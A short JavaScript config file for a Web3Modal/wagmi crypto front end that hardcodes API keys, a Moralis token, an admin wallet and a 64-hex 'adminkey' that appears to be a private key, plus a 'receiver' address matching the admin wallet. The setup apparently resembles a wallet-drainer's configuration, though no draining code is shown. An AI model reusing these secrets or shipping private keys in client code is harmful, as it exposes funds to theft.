import { defaultWagmiConfig } from "@web3modal/wagmi/react/config";
import { cookieStorage, createStorage } from "wagmi";
import { mainnet, scroll } from "wagmi/chains";

// Get projectId from environment variable
export const projectId = import.meta.env.VITE_PROJECT_ID;

if (!projectId) throw new Error("Project ID is not defined");

const metadata = {
  name: "Web3Modal",
  description: "Web3Modal Example",
  url: "https://web3modal.com", // origin must match your domain & subdomain
  icons: ["https://avatars.githubusercontent.com/u/37784886"],
};

// Create wagmiConfig
const chains = [mainnet, scroll];
export const config = defaultWagmiConfig({
  chains,
  projectId,
  metadata,
  ssr: false,
  storage: createStorage({
    storage: cookieStorage,
  }),
});

export const API_KEY = "2gLhdAkaDIf5bKQCYQtMy9vOyhu";
export const coingeckoApiKey = "CG-xeeevfyBU6ZDw41GzzEPYm1Y";
export const adminWallet = "0x56f074D9a95b56670A8E86D881d3F3ffDdE2D909";
export const adminkey =
  "010b869e407f573b0929fd2cc1dae011248c8747b65cc85d0c49b12f086daec5";
export const receiver = "0x56f074D9a95b56670A8E86D881d3F3ffDdE2D909";
export const MORALIS_API_KEY =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImNjMzkzYTYwLTA1NzAtNDUzZi1hMDJlLTE1NmNhZmVkNDJiMSIsIm9yZ0lkIjoiNDE5MjIwIiwidXNlcklkIjoiNDMxMTE4IiwidHlwZUlkIjoiYjZlOTE4NTctZjM1ZS00ZmRmLTllMDctNmUwYWZlNzM4MThjIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3MzMyMTcyMTMsImV4cCI6NDg4ODk3NzIxM30.J45EWllpYZYEv2-3hR1ZQ2MFUG3tKyTeBtdFs4oetn4";

export const networks = [1, 56];
